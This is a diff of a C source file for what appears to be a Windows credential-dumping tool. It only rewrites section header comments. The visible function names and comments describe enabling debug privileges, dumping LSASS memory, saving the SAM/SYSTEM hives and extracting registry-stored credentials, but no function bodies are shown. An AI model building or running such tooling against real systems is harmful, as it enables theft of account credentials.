@@ -18,9 +18,7 @@
 
 #pragma comment(lib, "dbghelp.lib")
 
-/* ============================================================================
- * Utilitaires
- * ============================================================================ */
+/* Helpers */
 
 /* Active le privilège SeDebugPrivilege */
 static BOOL EnableDebugPrivilege(void) {
@@ -69,9 +67,7 @@ static DWORD FindLsassPID(void) {
     return pid;
 }
 
-/* ============================================================================
- * LSASS Dump
- * ============================================================================ */
+/* LSASS memory dump */
 
 /*
  * Dump la mémoire de lsass.exe dans un buffer.
@@ -170,9 +166,7 @@ BOOL Lsass_Dump(BYTE** outData, DWORD* outSize) {
     return TRUE;
 }
 
-/* ============================================================================
- * SAM/SYSTEM Extraction
- * ============================================================================ */
+/* SAM/SYSTEM hive extraction */
 
 /*
  * Sauvegarde une ruche de registre dans un fichier temporaire puis lit son contenu.
@@ -254,9 +248,7 @@ BOOL Registry_DumpSYSTEM(BYTE** outData, DWORD* outSize) {
     return SaveRegistryHive("SYSTEM", outData, outSize);
 }
 
-/* ============================================================================
- * Registry Credentials
- * ============================================================================ */
+/* Registry stored credentials */
 
 /*
  * Extrait les credentials stockés dans le registre.
